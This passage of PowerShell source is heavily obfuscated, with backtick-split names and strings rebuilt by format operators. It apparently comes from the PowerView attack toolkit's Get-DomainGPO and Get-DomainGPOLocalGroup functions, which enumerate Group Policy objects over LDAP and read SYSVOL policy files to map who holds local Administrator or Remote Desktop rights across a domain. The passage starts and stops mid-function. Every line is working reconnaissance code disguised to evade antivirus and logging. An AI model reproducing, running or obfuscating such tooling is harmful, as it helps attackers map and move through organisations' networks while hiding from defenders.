        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{4}{2}{1}" -f 'Do','ller','ro','mainCon','t'})]
        [String]
        ${S`ervEr},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{1}{0}{2}"-f'neL','O','evel'}, {"{0}{1}"-f'Sub','tree'})]
        [String]
        ${sEAr`CHSc`ope} = ("{1}{0}" -f'btree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEs`Ul`T`pA`gesIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Ser`V`e`R`TImElImiT},

        [ValidateSet({"{1}{0}" -f'acl','D'}, {"{1}{0}"-f 'up','Gro'}, {"{0}{1}" -f 'N','one'}, {"{0}{1}"-f'O','wner'}, {"{0}{1}" -f'S','acl'})]
        [String]
        ${Secur`ITY`MA`SKs},

        [Switch]
        ${To`Mb`Sto`Ne},

        [Alias({"{1}{2}{0}"-f 'ne','Retu','rnO'})]
        [Switch]
        ${FI`N`DONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReDeNT`I`Al} =  ${Q`Fn}::"Em`pty",

        [Switch]
        ${r`AW}
    )

    BEGIN {
        ${s`EaRCHerar`GUMEn`Ts} = @{}
        if (${PSbOUndp`A`R`AM`Et`eRS}[("{1}{2}{0}" -f 'in','Dom','a')]) { ${S`EA`R`cHERArGuMENts}[("{1}{0}" -f'main','Do')] = ${d`OM`AIn} }
        if (${PS`BoUn`d`PaRAMe`TErS}[("{2}{1}{0}" -f's','ropertie','P')]) { ${SEARcHE`Ra`R`GuMENTS}[("{2}{0}{1}"-f'pe','rties','Pro')] = ${Pr`opeR`T`Ies} }
        if (${PS`B`OUn`DParaME`TERs}[("{2}{1}{0}" -f 'ase','rchB','Sea')]) { ${SE`AR`Ch`ErArguM`eN`TS}[("{1}{0}{2}" -f'a','Se','rchBase')] = ${sE`ARCH`BASe} }
        if (${PSbOuNdParAM`e`T`e`Rs}[("{0}{1}"-f'Serv','er')]) { ${SeA`R`cHer`A`Rg`UmeNtS}[("{1}{0}"-f'erver','S')] = ${sEr`V`eR} }
        if (${PSBO`UN`d`par`AmeTeRs}[("{2}{0}{1}" -f 'rchSc','ope','Sea')]) { ${Se`ArCH`ER`ArGu`MENtS}[("{0}{2}{1}" -f'Search','cope','S')] = ${SEarc`HSC`ope} }
        if (${Psb`oUND`PAr`A`mE`TeRs}[("{0}{2}{4}{3}{1}"-f'Re','e','sultPa','eSiz','g')]) { ${SE`ARCherAR`GuM`EntS}[("{1}{2}{3}{0}" -f'Size','Resu','ltPa','ge')] = ${RES`U`Lt`PAgESizE} }
        if (${PsB`Ou`Ndpar`AME`TERS}[("{1}{0}{3}{2}" -f 'rverTi','Se','eLimit','m')]) { ${sE`ArCHe`RaRg`UmeNts}[("{2}{1}{0}"-f'eLimit','rverTim','Se')] = ${Se`RVER`T`ImeLImiT} }
        if (${P`sbOUn`DpaR`Am`eT`ERS}[("{0}{2}{1}{3}"-f 'Sec','rityMas','u','ks')]) { ${sEarcH`ERA`Rg`UmeN`TS}[("{4}{1}{2}{3}{0}"-f'tyMasks','ec','ur','i','S')] = ${sec`UR`i`T`YmaSKs} }
        if (${Psb`ounDp`AR`AMetERS}[("{0}{1}" -f 'To','mbstone')]) { ${s`Earc`He`RA`RGume`NTS}[("{0}{2}{3}{1}" -f'To','tone','m','bs')] = ${ToM`BSTo`Ne} }
        if (${p`Sbo`U`N`d`PARaMETErs}[("{2}{0}{1}" -f 'n','tial','Crede')]) { ${sEA`Rc`heRaR`G`U`MEnTS}[("{1}{3}{0}{2}" -f 'edentia','C','l','r')] = ${c`REdE`NtIaL} }
        ${G`Po`S`earcheR} = &("{3}{4}{0}{2}{1}" -f '-Domai','r','nSearche','G','et') @SearcherArguments
    }

    PROCESS {
        if (${gpOseaR`c`h`eR}) {
            if (${psBoUn`dp`ArAmE`TeRS}[("{2}{4}{0}{3}{1}" -f 'de','ty','Co','nti','mputerI')] -or ${PsBoUn`dP`Aram`e`TerS}[("{2}{3}{0}{1}"-f 'den','tity','Us','erI')]) {
                ${gpoAD`sP`A`Ths} = @()
                if (${sEarchERAr`gU`M`eNts}[("{2}{0}{1}"-f 'ropert','ies','P')]) {
                    ${O`LdPro`Pe`RtIEs} = ${SEAR`c`heRArg`UmentS}[("{1}{2}{0}"-f'ies','Prop','ert')]
                }
                ${seAR`CHE`RAR`gU`MentS}[("{1}{2}{0}{3}"-f 'rtie','P','rope','s')] = ("{3}{0}{6}{5}{4}{7}{1}{8}{2}" -f'ti','dnsh','ame','dis','edn','ish','ngu','ame,','ostn')
                ${Ta`RG`et`coMp`UteRNAMe} = ${nu`LL}

                if (${PSbOunD`PARA`ME`TeRS}[("{1}{2}{3}{0}" -f 'ntity','Comp','uter','Ide')]) {
                    ${se`A`RChERARGUme`NtS}[("{0}{1}{2}" -f'I','denti','ty')] = ${COm`PU`TerId`ENtIty}
                    ${c`Ompu`TeR} = &("{2}{0}{3}{1}{4}" -f '-Doma','ompu','Get','inC','ter') @SearcherArguments -FindOne | &("{3}{0}{1}{2}" -f 'e','ct-Obj','ect','Sel') -First 1
                    if(-not ${C`omp`Uter}) {
                        &("{3}{0}{2}{4}{1}"-f 'ite-','ose','Ver','Wr','b') ('[Get'+'-Do'+'mainGPO]'+' '+'Co'+'mput'+'er '+"'$ComputerIdentity' "+'n'+'ot '+'fou'+'nd'+'!')
                    }
                    ${OBj`EctDn} = ${c`om`PU`TER}."diS`T`INGuIs`HEdN`A`me"
                    ${TaRGETCOMp`Ut`ErN`A`mE} = ${CoMPU`Ter}."Dnsh`o`stN`AMe"
                }
                else {
                    ${sE`A`R`ChE`RARGUMeN`TS}[("{2}{1}{0}"-f'ity','ent','Id')] = ${USerIde`Nt`Ity}
                    ${US`ER} = &("{3}{2}{0}{4}{1}"-f 'Domai','er','et-','G','nUs') @SearcherArguments -FindOne | &("{1}{2}{0}"-f'ect','S','elect-Obj') -First 1
                    if(-not ${U`SEr}) {
                        &("{1}{3}{0}{2}" -f'Verbo','Write','se','-') ('[Get-Do'+'ma'+'in'+'GP'+'O] '+'User'+' '+"'$UserIdentity' "+'n'+'ot '+'fo'+'und!')
                    }
                    ${ObJE`CT`dN} = ${US`er}."diS`T`I`NGUishedn`A`me"
                }

                
                ${O`BJEcT`ouS} = @()
                ${O`BJ`ecTOUs} += ${o`BJEcT`dn}.("{1}{0}" -f 'it','spl').Invoke(',') | &("{2}{0}{3}{4}{1}"-f'orEach','bject','F','-','O') {
                    if(${_}.("{2}{0}{1}" -f 'tartswit','h','s').Invoke('OU=')) {
                        ${oBJ`e`CtdN}.("{1}{0}" -f 'bString','Su').Invoke(${O`BjEct`DN}.("{2}{0}{1}" -f'x','Of','Inde').Invoke("$($_),"))
                    }
                }
                &("{2}{0}{3}{1}"-f'rite','Verbose','W','-') ('[Ge'+'t-Do'+'mainGPO'+']'+' '+'object'+' '+'O'+'Us: '+"$ObjectOUs")

                if (${ObJ`e`ctOUs}) {
                    
                    ${SeARcH`e`RA`RgUMeNTs}.("{0}{1}"-f'Rem','ove').Invoke(("{1}{2}{3}{0}" -f'erties','P','r','op'))
                    ${INherI`TANCedISa`B`l`ed} = ${fa`L`SE}
                    ForEach(${obj`e`cTou} in ${oBJE`CTO`Us}) {
                        ${seArCh`E`RaRGUmE`Nts}[("{1}{2}{0}"-f'ntity','I','de')] = ${o`B`JecToU}
                        ${GPoaD`sPAt`HS} += &("{3}{1}{0}{2}" -f'mainO','et-Do','U','G') @SearcherArguments | &("{1}{0}{2}{4}{3}"-f 'o','F','rEa','ect','ch-Obj') {
                            
                            if (${_}."gP`lInK") {
                                ${_}."Gp`LI`NK"."SP`Lit"('][') | &("{2}{4}{1}{3}{0}"-f'ject','O','ForE','b','ach-') {
                                    if (${_}.("{2}{0}{1}" -f'it','h','startsw').Invoke(("{1}{0}"-f'P','LDA'))) {
                                        ${p`ArTS} = ${_}.("{0}{1}" -f's','plit').Invoke(';')
                                        ${GP`O`DN} = ${p`Ar`Ts}[0]
                                        ${ENfoR`C`ed} = ${P`ARts}[1]

                                        if (${inHE`RItAN`c`edIs`ABl`eD}) {
                                            
                                            
                                            if (${ENfO`RCEd} -eq 2) {
                                                ${gp`o`Dn}
                                            }
                                        }
                                        else {
                                            
                                            ${G`P`OdN}
                                        }
                                    }
                                }
                            }

                            
                            if (${_}."g`POpTI`o`NS" -eq 1) {
                                ${In`he`RiTANcED`I`sAb`l`Ed} = ${TR`Ue}
                            }
                        }
                    }
                }

                if (${T`Ar`g`eTcoMpuTeRNAmE}) {
                    
                    ${Co`MpUTE`R`sITE} = (&("{3}{0}{4}{1}{2}"-f 'NetComp','rSite','Name','Get-','ute') -ComputerName ${TA`RGeTComp`U`TE`RnaMe})."si`Ten`AMe"
                    if(${COmPUTE`Rs`ITe} -and (${c`om`PuTErSiTE} -notlike ("{0}{2}{1}"-f 'Err','r*','o'))) {
                        ${sEaRChEr`Ar`GUMeN`Ts}[("{2}{1}{0}" -f 'ty','nti','Ide')] = ${C`o`MPU`TErsI`TE}
                        ${gPOA`d`SpaT`hs} += &("{4}{3}{2}{1}{0}" -f'te','i','mainS','et-Do','G') @SearcherArguments | &("{1}{0}{2}{3}" -f 'ch-','ForEa','Obj','ect') {
                            if(${_}."gpLi`Nk") {
                                
                                ${_}."Gpli`Nk"."S`PLit"('][') | &("{2}{1}{0}{3}"-f 'Objec','rEach-','Fo','t') {
                                    if (${_}.("{1}{2}{0}" -f'ith','st','artsw').Invoke(("{1}{0}" -f 'P','LDA'))) {
                                        ${_}.("{0}{1}" -f 'sp','lit').Invoke(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                
                ${o`BJ`E`cTdOMAiN`dn} = ${O`BJe`CtDN}.("{1}{0}"-f 'ing','SubStr').Invoke(${o`B`JEcTDN}.("{2}{1}{0}"-f 'dexOf','n','I').Invoke('DC='))
                ${sEaR`cHer`Arg`Um`enTs}.("{0}{1}" -f 'Rem','ove').Invoke(("{0}{2}{1}"-f 'Id','tity','en'))
                ${SEARC`her`A`RgUme`Nts}.("{0}{1}"-f'Re','move').Invoke(("{3}{2}{1}{0}"-f'es','ti','r','Prope'))
                ${sear`CHErA`R`GUm`eNTS}[("{2}{0}{3}{1}"-f 'DAP','er','L','Filt')] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                ${gp`OA`DsP`AThS} += &("{3}{4}{2}{1}{0}" -f 'ject','b','DomainO','Ge','t-') @SearcherArguments | &("{3}{0}{2}{1}" -f 'orEach-Ob','ect','j','F') {
                    if(${_}."gp`L`Ink") {
                        
                        ${_}."GP`LiNk"."spl`iT"('][') | &("{2}{1}{0}{3}{4}"-f 'ach-','orE','F','O','bject') {
                            if (${_}.("{3}{1}{2}{0}" -f'swith','t','art','s').Invoke(("{1}{0}" -f 'DAP','L'))) {
                                ${_}.("{0}{1}"-f's','plit').Invoke(';')[0]
                            }
                        }
                    }
                }
                &("{3}{1}{0}{2}"-f 'erbo','ite-V','se','Wr') ('['+'Get-Do'+'mainG'+'P'+'O] '+'GPO'+'A'+'dsPaths: '+"$GPOAdsPaths")

                
                if (${oL`DPro`Per`T`IES}) { ${Sea`RCHERarGU`me`Nts}[("{0}{2}{1}{3}" -f 'Prope','tie','r','s')] = ${OldP`Ro`Perties} }
                else { ${SE`A`RCHERA`RGuMENTs}.("{0}{1}" -f 'Rem','ove').Invoke(("{2}{1}{0}" -f'erties','p','Pro')) }
                ${SEAR`Ch`eRAR`gUmE`NtS}.("{1}{0}" -f'emove','R').Invoke(("{0}{2}{1}" -f'I','ity','dent'))

                ${gpO`A`dSP`AtHs} | &("{0}{2}{1}" -f'Whe','t','re-Objec') {${_} -and (${_} -ne '')} | &("{1}{0}{3}{4}{2}" -f 'ach','ForE','ject','-','Ob') {
                    
                    ${sEa`RchEr`AR`guMEN`TS}[("{2}{1}{0}"-f'Base','arch','Se')] = ${_}
                    ${sear`cH`e`RargUments}[("{2}{0}{1}"-f'PFilt','er','LDA')] = (("{3}{5}{8}{6}{7}{0}{4}{1}{2}"-f'p','licyContai','ner)','(','Po','o','jectCa','tegory=grou','b'))
                    &("{1}{4}{0}{2}{3}" -f'mainOb','Get-','jec','t','Do') @SearcherArguments | &("{2}{0}{1}{3}" -f'b','jec','ForEach-O','t') {
                        if (${ps`BOU`Nd`P`ARaMETeRS}['Raw']) {
                            ${_}."P`S`OBJECT"."tYPena`MeS".("{1}{0}"-f'rt','Inse').Invoke(0, ("{3}{1}{0}{2}"-f '.Ra','rView.GPO','w','Powe'))
                        }
                        else {
                            ${_}."ps`oB`JecT"."t`Y`PenAmEs".("{0}{1}" -f'Ins','ert').Invoke(0, ("{3}{4}{2}{1}{0}" -f'PO','ew.G','Vi','P','ower'))
                        }
                        ${_}
                    }
                }
            }
            else {
                ${IDe`N`Tity`FIltER} = ''
                ${fi`l`TeR} = ''
                ${ideN`TIty} | &("{0}{2}{1}{3}" -f'Wher','Obj','e-','ect') {${_}} | &("{2}{4}{1}{0}{3}"-f'je','b','ForEach','ct','-O') {
                    ${iDenTityin`S`TaN`cE} = ${_}.("{1}{0}" -f 'eplace','R').Invoke('(', '\28').("{2}{0}{1}"-f 'eplac','e','R').Invoke(')', '\29')
                    if (${iD`EnTI`TYINs`TanCe} -match ((("{2}{4}{3}{1}{0}" -f'^CN=.*','://luQ','LD','P','A'))."rEpl`Ace"('luQ',[stRINg][CHAR]124))) {
                        ${I`DE`NtiTyF`Il`TeR} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${PsBOUNdpAr`A`m`Eters}[("{0}{1}"-f 'D','omain')]) -and (-not ${psb`oundpArAMeT`E`Rs}[("{0}{2}{3}{1}" -f 'S','e','earchBa','s')])) {
                            
                            
                            ${I`DenTi`TY`d`OMain} = ${IDe`N`Tity`ins`T`ANcE}.("{2}{1}{0}"-f'ring','bSt','Su').Invoke(${IdE`NTitY`in`S`TanCe}.("{0}{1}" -f'Ind','exOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{0}{1}{2}"-f'Write','-Verbos','e') ('['+'G'+'et-Domai'+'nGPO] '+'Extra'+'c'+'t'+'ed '+'dom'+'a'+'in '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                            ${s`eaR`Che`R`ARGUMEnTS}[("{1}{0}{2}"-f'om','D','ain')] = ${iD`ENTit`Y`dOMa`in}
                            ${g`posEarC`HEr} = &("{5}{2}{1}{3}{4}{0}"-f'r','m','o','ainSea','rche','Get-D') @SearcherArguments
                            if (-not ${gP`oseAr`c`HER}) {
                                &("{0}{2}{1}" -f'Write-','ning','War') ('[Get-'+'Do'+'m'+'a'+'inGPO] '+'Un'+'able '+'to'+' '+'ret'+'ri'+'eve '+'do'+'main'+' '+'searche'+'r'+' '+'f'+'or '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${IdENt`It`YIn`sTAn`ce} -match '{.*}') {
                        ${ide`NTIT`Y`FI`lTeR} += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            ${g`U`ID`ByTeSTr`iNG} = (-Join (([Guid]${IdenTI`TY`IN`s`TaNCE}).("{0}{1}{2}"-f'ToByte','A','rray').Invoke() | &("{2}{3}{0}{1}{4}" -f 'bje','c','Fo','rEach-O','t') {${_}.("{0}{1}" -f 'ToSt','ring').Invoke('X').("{0}{1}"-f'P','adLeft').Invoke(2,'0')})) -Replace (("{1}{0}"-f'.)','(.')),'\$1'
                            ${IDe`NTITyfILT`eR} += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            ${iDeNtitY`F`iLT`ER} += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if (${i`D`ENTITYFI`lTeR} -and (${IDEn`T`ITYF`iLtER}.("{0}{1}"-f 'T','rim').Invoke() -ne '') ) {
                    ${Fi`lt`Er} += "(|$IdentityFilter)"
                }

                if (${PSBoun`DPaRam`E`TE`RS}[("{1}{2}{3}{0}"-f 'r','L','DAPF','ilte')]) {
                    &("{0}{4}{1}{2}{3}"-f'Wr','t','e-','Verbose','i') ('[Ge'+'t-Doma'+'inGPO'+'] '+'U'+'si'+'ng '+'add'+'itional'+' '+'LDA'+'P '+'filter'+':'+' '+"$LDAPFilter")
                    ${fI`LtER} += "$LDAPFilter"
                }

                ${gPOsE`A`RCheR}."FI`lter" = "(&(objectCategory=groupPolicyContainer)$Filter)"
                &("{0}{1}{2}" -f'Write-Ver','b','ose') "[Get-DomainGPO] filter string: $($GPOSearcher.filter) "

                if (${p`sbOun`DPaR`A`ME`TeRS}[("{1}{0}{2}" -f 'dOn','Fin','e')]) { ${R`esUL`Ts} = ${GPO`S`eArC`hER}.("{2}{0}{1}" -f'n','e','FindO').Invoke() }
                else { ${ReS`ULts} = ${gpo`S`EARCher}.("{0}{1}"-f'F','indAll').Invoke() }
                ${R`eS`Ults} | &("{2}{1}{0}" -f't','ec','Where-Obj') {${_}} | &("{2}{3}{1}{0}"-f'ct','ch-Obje','For','Ea') {
                    if (${PSBOu`ND`PaRAmE`Te`RS}['Raw']) {
                        
                        ${G`PO} = ${_}
                        ${g`pO}."p`sobJ`ecT"."tY`p`eNAmES".("{1}{0}"-f 'nsert','I').Invoke(0, ("{3}{2}{0}{4}{1}" -f'w','aw','erVie','Pow','.GPO.R'))
                    }
                    else {
                        if (${p`sBOuNDpARa`mE`TErs}[("{0}{2}{1}" -f'S','Base','earch')] -and (${s`eaRc`hbASe} -Match ("{0}{1}{2}" -f '^G','C','://'))) {
                            ${g`Po} = &("{1}{0}{3}{2}" -f'ert-','Conv','operty','LDAPPr') -Properties ${_}."PrOP`ErTI`es"
                            try {
                                ${G`PoDN} = ${G`PO}."DIstINgUi`Shed`N`AmE"
                                ${GP`oD`OMAIn} = ${gpO`Dn}.("{1}{2}{0}"-f'ring','SubS','t').Invoke(${g`P`ODN}.("{2}{1}{0}"-f'exOf','d','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                                ${gP`cFILes`YsPAtH} = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                ${g`pO} | &("{2}{1}{0}"-f 'mber','Me','Add-') ("{0}{2}{1}"-f 'No','y','tepropert') ("{0}{2}{1}{3}"-f 'gpcf','at','ilesysp','h') ${GP`cF`i`LEsyS`PatH}
                            }
                            catch {
                                &("{0}{2}{3}{1}" -f 'Wri','rbose','t','e-Ve') "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname) "
                            }
                        }
                        else {
                            ${G`pO} = &("{2}{0}{1}{3}{5}{4}"-f'nve','rt-LDAP','Co','P','ty','roper') -Properties ${_}."PR`O`PeRtIEs"
                        }
                        ${G`po}."PSOB`jE`cT"."T`yPenA`MEs".("{1}{0}"-f'nsert','I').Invoke(0, ("{0}{1}{2}" -f 'P','owerView.G','PO'))
                    }
                    ${G`Po}
                }
                if (${r`esultS}) {
                    try { ${R`ESulTs}.("{0}{1}" -f'dis','pose').Invoke() }
                    catch {
                        &("{1}{2}{0}" -f 'Verbose','Wr','ite-') ('['+'Get'+'-Domai'+'n'+'GPO] '+'E'+'rro'+'r '+'dispos'+'in'+'g '+'o'+'f '+'th'+'e '+'Result'+'s '+'obj'+'e'+'ct: '+"$_")
                    }
                }
                ${GPO`S`earch`eR}.("{1}{0}" -f 'ose','disp').Invoke()
            }
        }
    }
}


function GET-d`O`ma`I`NgPOl`Ocal`GRoup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}"-f'P','uldProc','SSho','ess'}, '')]
    [OutputType({"{4}{2}{0}{3}{1}"-f 'View.GPO','oup','r','Gr','Powe'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSition = 0, VaLuefrOmpipEliNe = ${tR`Ue}, valuEfROMpIpeLIneBYPRoPERtYnAme = ${Tr`Ue})]
        [Alias({"{0}{2}{3}{1}"-f'Di','e','stinguishedN','am'}, {"{2}{0}{1}"-f'co','untName','SamAc'}, {"{1}{0}"-f 'e','Nam'})]
        [String[]]
        ${ide`N`TITY},

        [Switch]
        ${ResOlV`eME`M`B`ersTosidS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`omAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Filt','er'})]
        [String]
        ${Ld`Apfi`l`Ter},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'SPath','D','A'})]
        [String]
        ${sEArC`hB`A`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{2}{3}{1}{0}" -f 'er','oll','main','Contr','Do'})]
        [String]
        ${SEr`Ver},

        [ValidateSet({"{0}{1}" -f 'Ba','se'}, {"{0}{2}{1}"-f 'O','vel','neLe'}, {"{0}{1}{2}"-f'Su','b','tree'})]
        [String]
        ${sEa`RC`HsCope} = ("{2}{0}{1}" -f 're','e','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${re`suL`TPAGes`iZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeR`VErTImel`IMIT},

        [Switch]
        ${T`o`Mb`stOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRed`e`NtI`Al} =   ( gET-VAriaBLe ("{0}{1}" -f'QF','N')  -vAluEoNLY)::"e`MPtY"
    )

    BEGIN {
        ${sear`cH`eRar`guME`Nts} = @{}
        if (${p`SBOUNd`PArAm`ete`RS}[("{0}{1}" -f 'Dom','ain')]) { ${seaRCHeRArg`UM`e`NTs}[("{1}{0}"-f'main','Do')] = ${D`OMA`In} }
        if (${psboUNdPar`AM`ete`RS}[("{2}{0}{1}" -f'APFilt','er','LD')]) { ${sEArChEraR`GUm`e`NTs}[("{3}{0}{1}{2}" -f 'Fil','te','r','LDAP')] = ${d`oMaIN} }
        if (${PsB`ounDParAMe`TE`Rs}[("{2}{1}{0}" -f 'e','earchBas','S')]) { ${SE`ARChE`R`ARguMEnTS}[("{2}{0}{1}" -f'ea','rchBase','S')] = ${seArch`BA`sE} }
        if (${psb`O`UNd`PArAMETERS}[("{0}{1}"-f'S','erver')]) { ${S`EaRCh`ERARgUmeN`TS}[("{0}{2}{1}" -f'Se','r','rve')] = ${sER`VeR} }
        if (${PSBOu`N`DpAraM`Ete`RS}[("{2}{1}{0}"-f 'ope','Sc','Search')]) { ${s`EarCHe`RArG`UM`ENTS}[("{3}{2}{1}{0}" -f 'pe','co','hS','Searc')] = ${SeARCh`s`C`oPe} }
        if (${psBouNDpaRa`m`et`erS}[("{0}{2}{3}{1}" -f'R','ltPageSize','e','su')]) { ${sEA`R`cHER`ArgumEnTS}[("{3}{2}{1}{0}" -f 'geSize','ltPa','su','Re')] = ${r`esU`l`TPaGESizE} }
        if (${p`SbO`U`NDPaR`A`mEtERs}[("{0}{1}{3}{4}{2}"-f 'ServerT','i','t','meLim','i')]) { ${sEar`chER`AR`GuM`eNtS}[("{1}{0}{2}{4}{3}" -f 've','Ser','r','imeLimit','T')] = ${Se`RVErtIMelI`MIT} }
        if (${pSbOu`N`dPaR`Am`Et`ERS}[("{0}{3}{1}{2}" -f 'T','mbst','one','o')]) { ${SeaR`CHera`RG`UMenTS}[("{1}{2}{0}"-f'tone','Tomb','s')] = ${to`MBSt`oNE} }
        if (${pS`BOunDP`AR`AMeT`ErS}[("{2}{0}{1}{3}" -f 'eden','ti','Cr','al')]) { ${SEarc`he`RAR`gUmeNTs}[("{2}{3}{1}{0}" -f 'l','ia','Cr','edent')] = ${Cr`eDeN`Ti`AL} }

        ${conV`eRT`ARgU`mENTs} = @{}
        if (${psBo`UnDpaRA`MEt`ers}[("{0}{1}" -f 'Do','main')]) { ${CON`V`e`RtaRGUMe`NTs}[("{0}{1}{2}" -f 'D','om','ain')] = ${D`O`mAin} }
        if (${pSbOUnD`paraM`E`T`ers}[("{1}{0}{2}" -f'e','S','rver')]) { ${C`oNV`eRtAR`GU`M`eNTS}[("{1}{0}"-f 'er','Serv')] = ${sEr`V`Er} }
        if (${p`sBounDpA`R`Ame`TeRS}[("{0}{2}{1}" -f'Cred','tial','en')]) { ${coNVE`RtAr`Gum`EN`Ts}[("{2}{0}{3}{1}"-f 'e','ial','Cr','dent')] = ${cre`dentI`Al} }

        ${s`plIToP`TiOn} =   (iTem ("{1}{2}{0}"-f 'BLE:IwA0p','Var','Ia'))."va`LUE"::"reMOveEm`PTye`Nt`RIES"
    }

    PROCESS {
        if (${pSBo`Undp`AR`AmE`TerS}[("{0}{1}" -f 'Identi','ty')]) { ${SEa`RCh`eRArG`U`m`EntS}[("{0}{2}{1}"-f 'I','ntity','de')] = ${IdE`Nt`iTy} }

        &("{2}{1}{3}{0}" -f'O','omai','Get-D','nGP') @SearcherArguments | &("{3}{0}{2}{1}" -f'orEach-Ob','t','jec','F') {
            ${g`PodIsPlaY`N`AMe} = ${_}."DI`s`PlAYNAMe"
            ${g`PoNA`ME} = ${_}."N`AME"
            ${GP`o`PATH} = ${_}."gPcF`ILES`YSpAtH"

            ${P`ARsEaR`gS} =  @{ ("{1}{2}{0}"-f'th','GptTmpl','Pa') = ("$GPOPath\MACHINE\Microsoft\Windows "+('N'+'T{0}'+'S'+'ecE'+'dit'+'{0}G'+'ptTmpl.inf') -f[cHaR]92) }
            if (${PSBO`Un`d`PaRam`ET`eRS}[("{1}{0}{2}{3}"-f 'red','C','en','tial')]) { ${p`ArSear`Gs}[("{2}{0}{1}"-f 'redent','ial','C')] = ${CRE`d`eNTIAL} }

            
            ${i`NF} = &("{1}{2}{0}" -f'pl','G','et-GptTm') @ParseArgs

            if (${i`NF} -and (${I`Nf}."pSBA`se"."k`EYs" -contains ("{0}{1}{2}" -f 'G','roup Mem','bership'))) {
                ${MeMBe`RS`H`IPS} = @{}

                
                ForEach (${Mem`B`erSHiP} in ${I`NF}.'Group Membership'.("{2}{1}{0}{3}"-f't','tEnumera','Ge','or').Invoke()) {
                    ${g`RoUP}, ${R`eLATi`ON} = ${ME`MBErs`h`iP}."K`eY".("{1}{0}"-f't','Spli').Invoke('__', ${s`PlITopTi`oN}) | &("{4}{3}{0}{1}{2}"-f 'rEach-','Objec','t','o','F') {${_}.("{1}{0}"-f 'im','Tr').Invoke()}
                    
                    ${m`EMBE`Rs`HIpvaL`UE} = ${me`mbEr`shiP}."V`Alue" | &("{1}{2}{0}" -f'bject','Where-','O') {${_}} | &("{3}{0}{2}{1}" -f 'Each-Ob','ect','j','For') { ${_}.("{0}{1}" -f'T','rim').Invoke('*') } | &("{2}{1}{0}"-f 'ct','bje','Where-O') {${_}}

                    if (${pSbOu`ND`Par`AmE`Ters}[("{1}{2}{4}{3}{0}" -f's','Resolv','eMembersTo','ID','S')]) {
                        
                        ${grO`UpMeMBE`Rs} = @()
                        ForEach (${Me`MBer} in ${me`MBE`Rshi`pVAlUe}) {
                            if (${M`EMB`ER} -and (${Me`MBer}.("{0}{1}"-f'Tri','m').Invoke() -ne '')) {
                                if (${ME`MbeR} -notmatch ("{1}{0}"-f '-.*','^S-1')) {
                                    ${coNvEr`TTOA`RgUmE`NTs} = @{("{1}{2}{0}" -f 'tName','Ob','jec') = ${mEm`BeR}}
                                    if (${PsBoU`NDP`Ara`M`EtErs}[("{1}{0}"-f 'main','Do')]) { ${cONv`erTtOArg`U`MeNTS}[("{0}{1}" -f 'D','omain')] = ${DOMA`IN} }
                                    ${m`E`mbErsId} = &("{3}{1}{2}{0}"-f'ID','nv','ertTo-S','Co') @ConvertToArguments

                                    if (${Mem`B`ER`sID}) {
                                        ${grOUP`MEM`BErS} += ${m`Emb`eR`sID}
                                    }
                                    else {
                                        ${GRO`UPMemB`eRS} += ${M`emb`er}
                                    }
                                }
                                else {
                                    ${gRouP`meMBe`Rs} += ${me`MBer}
                                }
                            }
                        }
                        ${mEmb`eRshipv`A`lUE} = ${G`ROUpmembe`Rs}
                    }

                    if (-not ${MemBE`RSh`i`PS}[${Gr`o`UP}]) {
                        ${ME`m`BE`RsHipS}[${G`RouP}] = @{}
                    }
                    if (${m`eMbE`R`sHipV`ALue} -isnot [System.Array]) {${MemberS`HiP`V`AluE} = @(${M`emBe`RsHIp`VaLue})}
                    ${MEMbE`Rshi`PS}[${GR`ouP}].("{0}{1}"-f'A','dd').Invoke(${rEL`AtIon}, ${m`EM`Ber`S`HIPvAluE})
                }

                ForEach (${Me`mb`ers`hip} in ${mEmb`eR`S`hiPS}.("{2}{0}{1}"-f 'et','Enumerator','G').Invoke()) {
                    if (${m`E`Mbe`RShIp} -and ${meM`BERsH`ip}."k`EY" -and (${m`Em`BErsh`ip}."k`Ey" -match '^\*')) {
                        
                        ${g`R`OuPSiD} = ${me`Mbe`RSHip}."k`Ey".("{1}{0}"-f 'rim','T').Invoke('*')
                        if (${grOU`P`sId} -and (${Gro`U`pS`iD}.("{1}{0}" -f 'rim','T').Invoke() -ne '')) {
                            ${grOU`P`NaME} = &("{1}{4}{0}{2}{3}" -f 'vertF','C','rom-','SID','on') -ObjectSID ${GROupS`ID} @ConvertArguments
                        }
                        else {
                            ${G`R`ouPnaME} = ${FAL`Se}
                        }
                    }
                    else {
                        ${gr`OU`PNaMe} = ${mEm`B`eRsHIP}."K`eY"

                        if (${gro`U`pN`Ame} -and (${gro`UpnA`ME}.("{1}{0}"-f 'm','Tri').Invoke() -ne '')) {
                            if (${g`R`OupnAME} -match ("{4}{2}{3}{1}{0}" -f 's','r','ist','rato','Admin')) {
                                ${g`ROu`PsId} = ("{1}{3}{0}{2}"-f'5-','S','32-544','-1-')
                            }
                            elseif (${grou`P`NamE} -match ("{2}{1}{0}" -f'ktop','ote Des','Rem')) {
                                ${gR`O`U`pSid} = ("{0}{1}{2}{3}"-f'S-1-5-3','2-','5','55')
                            }
